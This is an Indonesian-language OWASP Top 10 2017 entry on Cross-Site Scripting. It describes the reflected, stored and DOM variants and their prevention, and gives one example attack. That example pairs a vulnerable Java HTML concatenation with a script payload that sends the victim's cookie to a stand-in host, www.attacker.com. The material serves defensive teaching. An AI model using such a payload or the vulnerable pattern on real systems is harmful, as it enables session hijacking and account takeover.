# A7:2017 Cross-Site Scripting (XSS)

| Agen ancaman / vektor serangan | Kelemahan Keamanan          | Dampak              |
| -- | -- | -- |
| Akses Lvl: Eksploitasi 3 | Prevalensi 3 : Deteksi 3 | Teknis 2 : Bisnis |
| Tool otomasi dapat  mendeteksi dan melakukan exploit pada semua tiga type XSS, and ada Framework eksploitasi yang tersedia secara gratis. | XSS adalah kerentanan paling umum kedua di OWASP Top 10, dan  masih ditemukan di sekitar dua pertiga dari semua aplikasi. Tool otomasi dapat menemukan beberapa kerentanan XSS secara otomatis, Khususnya dalam aplikasi pemrograman seperti PHP, J2EE / JSP, dan ASP.NET. | Dampak pada XSS untuk kategori medium untuk Reflected XSS dan DOM XSS dan Kritikal untuk stored XSS, dengan eksekusi kode jarak jauh di browser korban, seperti mencuri kredensial, sesi, atau mengirimkan malware ke korban |

## Apakah Aplikasi itu Rentan?

Ada Tiga Jenis XSS, biasanya menargetkan browser pengguna:

* **Reflected XSS**: Aplikasi atau API menyertakan masukan pengguna yang tidak divalidasi dan tidak lolos sebagai bagian dari keluaran HTML. Serangan yang berhasil memungkinkan penyerang mengeksekusi HTML dan JavaScript sewenang-wenang di browser korban. Biasanya pengguna perlu berinteraksi dengan beberapa tautan berbahaya yang mengarah ke laman yang dikendalikan penyerang, seperti situs web watering hole berbahaya, iklan, atau sejenisnya
* **Stored XSS**: Aplikasi atau API menyimpan masukan pengguna yang tidak dibersihkan yang dilihat di lain waktu oleh pengguna lain atau administrator. XSS yang disimpan sering dianggap sebagai risiko tinggi atau kritis.
* **DOM XSS**: Kerangka kerja JavaScript, aplikasi halaman tunggal, dan API yang secara dinamis menyertakan data yang dapat dikontrol penyerang ke halaman rentan terhadap DOM XSS. Idealnya, aplikasi tidak akan mengirim data yang dapat dikontrol penyerang ke JavaScript API yang tidak aman.
Serangan XSS termasuk pencurian sesi user, account takeover, _MFA bypass_, _DOM node replacement_ atau merubah tampilan website target (seperti panel login trojan), 
serangan terhadap browser pengguna seperti unduhan perangkat lunak berbahaya, pencatatan log kunci, dan serangan sisi klien lainnya.

## Bagaimana Cara Pencegahannya

Pencegahan XSS membutuhkan pemisahan pada data yang tidak terpecaya dari konten browser yang aktif. Ini dapat dicapai dengan:

* Menggunakan kerangka kerja yang secara otomatis lolos dari XSS berdasarkan desain, seperti Ruby on Rails terbaru, React JS. Pelajari batasan perlindungan XSS setiap framework dan tangani kasus penggunaan yang tidak tercakup dengan tepat.
* Mengeluarkan semua data yang tidak dipercaya berdasarkan konteks HTML (_body, attribute, JavaScript, CSS, atau URL)_ akan menutup celah Reflected and Stored XSS. Lihat OWASP XSS Prevention Cheat Sheet untuk detail dari teknik mengeluarkan data.
* Menerapkan pengkodean berkonteks peka saat memodifikasi dokumen browser di sisi klien bertindak melawan DOM XSS. Jika hal ini tidak dapat dihindari, teknik pelolosan sensitif konteks serupa dapat diterapkan ke API browser seperti yang dijelaskan di OWASP Cheat Sheet 'DOM based XSS Prevention'.
* Memungkinkan [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)sebagai kontrol mitigasi pertahanan mendalam terhadap XSS. Ini efektif jika tidak ada kerentanan lain yang memungkinkan penempatan kode berbahaya melalui penyertaan file loka (e.g. path traversal menimpa atau pustaka yang rentan dari jaringan pengiriman konten yang diizinkan).

## Contoh Skenario Serangan

**Skenario #1**: Aplikasi menggunakan data tidak tepercaya dalam pembuatan kode HTML berikut tanpa validasi:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
Penyerang memodifikasi parameter ‘CC’ dalam browser menjadi:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Serangan ini disebabkan ID sesi korban untuk dikirim ke situs web penyerang, sehingga memungkinkan penyerang untuk membajak sesi pengguna saat ini.

**Note**: Penyerang dapat menggunakan XSS untuk mengalahkan pertahanan Cross-Site Request Forgery (CSRF) otomatis yang mungkin digunakan aplikasi

## Referensi

### OWASP

* [OWASP Proactive Controls: Encode Data](https://wiki.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://wiki.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://wiki.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://wiki.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://wiki.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://wiki.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://wiki.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://wiki.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://wiki.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project)

### External

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
